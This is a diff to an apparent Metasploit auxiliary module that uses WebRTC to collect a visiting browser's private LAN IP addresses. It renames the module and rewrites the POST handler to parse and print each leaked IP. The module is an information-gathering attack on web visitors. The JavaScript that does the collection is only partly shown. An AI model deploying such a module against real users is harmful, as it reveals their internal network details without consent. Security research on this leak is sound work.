@@ -5,15 +5,15 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
+  require 'ipaddr'
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'           => "Private IP Leakage to WebPage using WebRTC Function.",
+        'Name'           => "HTTP Client LAN IP Address Gather",
         'Description'    => %q(
-        This module uses WebRTC component to gather complete client information and browser can
-        disclose a private IP address in a STUN request
+        This module retrieves a browser's network interface IP addresses using WebRTC
         ),
         'License'        => MSF_LICENSE,
         'Author'         => [
@@ -134,7 +134,14 @@ getIPs(function(ip){
       send_response(cli, @html)
     when 'post'
       print_status("#{cli.peerhost}: Received reply:")
-      print_line("#{puts request.to_s}")
+      values = request.to_s.split("\n")
+      values.each do |value|
+         begin
+            ip = IPAddr.new value
+	    print_line("Fetched Private IP: #{ip.to_s}")
+         rescue
+         end
+     end
     else
       print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
     end
